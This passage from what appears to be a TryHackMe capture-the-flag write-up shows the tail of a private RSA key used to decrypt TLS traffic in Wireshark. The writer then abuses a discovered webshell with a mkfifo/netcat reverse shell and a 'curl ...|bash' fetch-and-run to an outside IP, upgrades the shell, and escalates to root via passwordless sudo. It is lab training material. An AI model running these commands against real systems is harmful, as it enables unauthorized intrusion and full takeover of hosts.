vKgue0cRDZCKYHYjiIYgekzrFO0w2e4yk5wF6OR1VZYqmWengA6xJ93+TT1LyvTW
k9dJ9aqtJqlziVz+1t2KrQ/yL5cHONCpCZp538o3TqfcHxGZO/btvy/wHyGF8Ypg
lEGzI1kVZd37Sh7NDieJriYdxTvwPEymq/JrMj8WN/urnsqufgybVtaKTvGns7DB
ircqnnQliNFhoZIeemskyfcLUI6kKbjjlLUgQUsMj97436xtAoIBAQDfie8u4TaD
Dvfa8tORkHTtygHBZwvEkHjCioPvMcgTwS/3nLCAcWVQqnWIy56QX6hR0VSeYjoc
E0atQ689XFaQ6Yi7GTitipnocMx5fr+DnueJHalmDfYCFGVRsHFLqUq2A0KPUeEz
zcnDLS4XxO5uSAuGrzTbT0OZFbu0VGhqfJ7Ok/3/4KI1AjF/ydng9/CwZ6flaCUH
XMxP29S60X7+6Yn1J9GigO8p5hJ/1yzi2lInvdEdhW7gWwI1rwF8/PAVBb+pWQMK
o+BFUrh1rwDq2b6pBbel5D8mU4vbjZQRl+3SStzIl7vNNO5IUZnEJlzL8cIrsKfj
+BTTmp8B33EZAoIBAE/rihSyWoR+FcU1JJELoaWF1jGmIIpl4qok/tEt4yKPAX5L
80IXDc3ne2SNKOd8u0KV42qXnLuziMnf8wq+/KYs2GsuHZ9UUmrpLpPFANi7Q1Yq
jAOD9UWp8Q514xikuEGBzux9W//PH6fYY2Q+8XrwU4ZcXq50b9n0VmVMCzbsbV4U
Krli1e0usCgSsclzdIW3Fx+UpAC6r3mh9Cn0wSBQ1uqZZdus2MmEwehBDjU0IvuM
r8Me1msWdhsYn739DXPrG0ZP3xWCIzghb8AaZIUxBpdQbijJ5PBwT64DbEBUyg6I
O5zNVi0/1ITYSsMi0x35DoKskci05mL3FDBmeL0CggEAK51rGJeCnlGmVIb6drVb
yyWV8Bld921E0phaI6pv4kLYTBS7b2Qwo2uO4TDxcDPp0ITqYLjDo8SzDo1dPLiu
fznBntfN8jZPz0Vq7+2mClVP0bYC3lGtBTzbg/PMNzoBxL+gFfyg1w245ycCjkqz
Rrsx3IaE5qFxjAXsiMPLV7OW/LFtZqZ6n6Mc61UD+NwHjzO6U41dZDFb/9zhhc3o
XG5Op5GsWmuTvnYQd/cQ3/Y+/1gO3BazynyXUsghnzRu13s2qSEf8cyFrqD0MqoB
oND5XVsrOOfu1liIuj7GfCRLl7NZnp3UW7aPI3cgbGAbzQMPopymNVmrHppVmfTx
yQKCAQEAjHHXVVNG1MczDSxiScDxKwHA4bjk8+FcLmIs0AHEPy1y58ZG5ztG9rsj
mvSqOXdrK2Gq3x9QqGI1Y7AqPHirBoq7U4UVhDCeEPALCjwKFQz/b1YfZYtUu7uY
2oZ7GmKD1MUNnkzp9BjC02JclSFglb/PpHMhYZSB4W0P8mJtsJCkVd4LpthhuVJn
tc0d+it0CVQSko3I6qN535x1KzlFkGy8i/P+nvBeCzbccV9fakubxk68OMmgflWA
tBlKzXdlqLoHbWLptdcQhV8pisZrLhd42C+YFb+LY34EQ3MSq/JTPQab73Zxb1qY
8zgwXPatVQA2vA1aN1A1anOcmGZPQg==
-----END PRIVATE KEY-----
```

I'm going to go ahead and save the key into a file on my machine.

### Adding the key

![Example Image](images/add-key.png)

In Wireshark go to: Edit -> Prefrences -> Protocols -> TLS -> RSA Keys List EDIT
Select the key that you saved.

### Wireshark decrypted traffic

![Example Image](images/webshell.png)

Filtering Wireshark by http shows some VERY interesting traffic. Looks like someone was accessing a webshell!

```bash
jack@ubuntu:/etc/apache2/certs$ curl -k 'https://127.0.0.1:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>

```

It works! :DDD


### Catching a new shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.16.164 9001 >/tmp/f
```

Saved as rev.sh and hosted on my python webserver.

```bash
nc -lvnp 9001
```
Started a new netcat listener

```bash
jack@ubuntu:/etc/apache2/certs$ curl -k 'https://127.0.0.1:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=curl+10.6.16.164/rev.sh|bash'
```

```bash
python3 -m http.server 80                                                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.248.178 - - [24/May/2024 03:23:24] "GET /linpeas.sh HTTP/1.1" 200 -
10.10.248.178 - - [24/May/2024 04:10:00] "GET /rev.sh HTTP/1.1" 200 -
```

Gets a hit! :DDD

```bash
nc -lvnp 9001  
listening on [any] 9001 ...
connect to [10.6.16.164] from (UNKNOWN) [10.10.248.178] 57714
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/usr/lib/cgi-bin$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                                                                                                                                                            
REDACTED@REDACTED:~/THM/whyhackme$ stty raw -echo; fg; reset
[1]  + continued  nc -lvnp 9001

www-data@ubuntu:/usr/lib/cgi-bin$ export TERM=xterm
www-data@ubuntu:/usr/lib/cgi-bin$ stty rows 68 cols 252
```

Shell caught and upgraded! Now we're www-data

## www-data -> root

```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
www-data@ubuntu:/usr/lib/cgi-bin$ sudo bash
root@ubuntu:/usr/lib/cgi-bin# id
uid=0(root) gid=0(root) groups=0(root)

root@ubuntu:~# cat root.txt 
4dbe2259aeREDACTED
```

Well that was ez :P













































































